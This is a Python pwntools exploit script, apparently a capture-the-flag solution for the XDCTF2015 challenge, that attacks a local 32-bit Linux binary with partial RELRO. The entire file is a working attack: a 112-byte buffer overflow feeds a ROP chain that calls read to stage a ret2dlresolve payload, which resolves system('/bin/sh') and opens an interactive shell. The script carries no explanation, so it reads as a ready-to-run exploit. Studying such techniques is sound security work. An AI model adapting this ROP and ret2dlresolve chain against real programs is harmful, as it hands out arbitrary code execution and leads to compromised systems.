from pwn import *
context(arch='i386', os='linux', log_level='debug')
p       = process('./main_partial_relro_32')
elf     = ELF('./main_partial_relro_32')

dl              = 0x08048370
pop_ret         = 0x08048649
read_plt        = elf.plt['read']
ret2dl          = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

p.recvuntil('Welcome to XDCTF2015~!\n')

payload = b'a' * 112 + p32(read_plt) + p32(pop_ret) + p32(0) + p32(ret2dl.data_addr) + p32(len(ret2dl.payload))
payload += p32(dl) + p32(ret2dl.reloc_index) + p32(0) + p32(ret2dl.real_args[0])
p.send(payload)
p.send(ret2dl.payload)

p.interactive()